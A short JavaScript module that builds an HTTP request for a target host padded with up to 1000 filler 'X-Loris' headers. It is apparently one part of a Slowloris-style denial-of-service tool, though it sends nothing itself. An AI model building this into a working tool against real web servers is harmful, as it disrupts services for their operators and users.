const requestConfigurator = (target, requetLimit = 1000) => {
  var request = ["Host: " + target + "\r\n", "Accept: */*\r\n"].join("");
  while (requetLimit--) {
    request += "X-Loris-" + requetLimit + ": " + requetLimit + "\r\n";
  }
  request += "\r\n";

  return request;
};

module.exports = { requestConfigurator };
